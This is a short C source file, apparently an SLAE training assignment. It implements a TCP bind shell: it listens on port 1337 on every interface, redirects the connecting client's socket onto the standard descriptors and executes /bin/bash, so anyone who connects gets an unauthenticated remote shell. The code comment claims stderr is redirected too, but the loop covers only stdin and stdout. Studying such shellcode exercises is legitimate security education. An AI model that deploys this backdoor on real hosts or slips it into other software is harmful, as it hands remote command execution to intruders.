/*
* SLAE Assigment1 - Bind shell
* Author: rtmcx (rtmcx@protonmail.com)
* Inspiration taken from "The Art of Exploitaion" by Jon Ericsen
* and http://umiacs.com/
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SRVPORT 1337

int main()
{
	// Address information for server and client
	// sockaddr_in is found in 'netinet/in.h'
	struct sockaddr_in host_addr, client_addr; 
	
	// Set up the values for the listening socket	
	host_addr.sin_family = AF_INET;
	host_addr.sin_port = htons(SRVPORT);
	host_addr.sin_addr.s_addr =  htonl (INADDR_ANY);
	
	// Create a TCP socket, stream and protocol IP.
	int sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);	
	
	// Bind the socket to the host
	bind (sockfd, (struct sockaddr *) &host_addr, sizeof(struct sockaddr));

	// Start to listen on the socket..
	listen (sockfd, 0);
	
	// Accept incomming request
	socklen_t sin_size = sizeof(struct sockaddr_in);	
	int clientfd = accept(sockfd, (struct sockaddr *) &client_addr, &sin_size);
	
	// Duplicate the socket to stdin, stdout, stderr
	for (int i = 0; i < 2; i++){
		dup2(clientfd, i);
	}
	
	// And execute the shell
	execve("/bin/bash", NULL, NULL);	
}
